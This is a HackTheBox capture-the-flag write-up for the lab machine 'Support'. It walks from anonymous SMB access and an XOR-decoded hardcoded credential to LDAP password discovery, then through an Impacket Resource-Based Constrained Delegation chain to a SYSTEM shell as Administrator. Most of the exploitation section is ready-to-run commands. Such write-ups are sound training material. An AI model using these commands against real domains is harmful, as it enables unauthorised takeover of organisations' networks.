# Support — HackTheBox

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Windows (Active Directory) |
| **Date** | April 2026 |
| **Status** | Retired |
| **Tags** | Active Directory, .NET Reverse Engineering, LDAP, RBCD |

## Overview

Support is an Easy Windows Active Directory machine. The path to Domain Admin runs through a leaked LDAP credential hidden in a custom .NET binary, a plaintext password stored in an LDAP `info` field, and a Resource-Based Constrained Delegation (RBCD) attack abusing `SeMachineAccountPrivilege`.

## Recon

```bash
nmap -sVC -Pn 10.129.230.181
```

- 53 (DNS), 88 (Kerberos), 389/3268 (LDAP), 445 (SMB), 5985 (WinRM) — confirms a Domain Controller

## Enumeration

```bash
smbclient -L //10.129.230.181 -N
smbclient //10.129.230.181/support-tools -N
```

The `support-tools` share is accessible anonymously. Most files are generic tools, except `UserInfo.exe.zip`.

### Credential Discovery

Decompiling `UserInfo_source.cs` (with ILSpy) revealed a Base64-encoded password and an XOR key (`armando`):

```python
decoded = (b64decode(enc_password)[i] ^ key[i % len(key)] ^ 0xDF)
```

This decoded to LDAP credentials for `support\ldap`.

### LDAP Enumeration (authenticated)

```bash
echo "10.129.230.181 support.htb dc.support.htb" | sudo tee -a /etc/hosts

ldapsearch -x -H ldap://support.htb \
  -D "support\ldap" -w '<decoded password>' \
  -b "DC=support,DC=htb" "(objectClass=user)" \
  sAMAccountName description info
```

The `support` user account had a plaintext password stored directly in its LDAP `info` field — a classic AD misconfiguration.

## Exploitation — RBCD Path

Authenticating as `support` revealed membership in `Shared Support Accounts`, which grants `SeMachineAccountPrivilege` and `GenericAll` on the `DC$` computer object — a textbook Resource-Based Constrained Delegation path.

```bash
# Step 1 — Add a fake computer account
impacket-addcomputer support.htb/support:'<password>' \
  -computer-name 'FAKEC$' -computer-pass 'FakePass123!' \
  -dc-ip 10.129.230.181

# Step 2 — Set RBCD delegation on the DC
impacket-rbcd support.htb/support:'<password>' \
  -delegate-from 'FAKEC$' -delegate-to 'DC$' \
  -action write -dc-ip 10.129.230.181

# Step 3 — Request a Kerberos ticket impersonating Administrator
impacket-getST support.htb/FAKEC\$:'FakePass123!' \
  -spn cifs/dc.support.htb -impersonate Administrator \
  -dc-ip 10.129.230.181

# Step 4 — Use the ticket for a SYSTEM shell
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec support.htb/Administrator@dc.support.htb -k -no-pass
# whoami -> nt authority\system
```

## Attack Chain

```
Anonymous SMB -> UserInfo.exe.zip -> decompile (.NET) -> XOR-decoded LDAP creds
   -> LDAP enum -> plaintext password in `info` field -> shell as support (USER FLAG)
   -> SeMachineAccountPrivilege + GenericAll on DC$
   -> Add fake computer -> RBCD delegation -> impersonate Administrator
   -> SYSTEM shell (ROOT FLAG)
```

## Lessons Learned

- Always check SMB shares anonymously before anything else.
- Custom internal binaries frequently hide hardcoded credentials — decompile with ILSpy/dnSpy.
- LDAP `info`/`description` fields are an underrated place to find plaintext passwords.
- `SeMachineAccountPrivilege` + write access on a computer object is a reliable path to RBCD.
- RBCD delegation must be set **before** requesting the service ticket.
- Run Impacket tools from a writable directory.

---

Author: Hamza Al-Najjar (Z3R0) — see the [full writeup index](../../README.md)
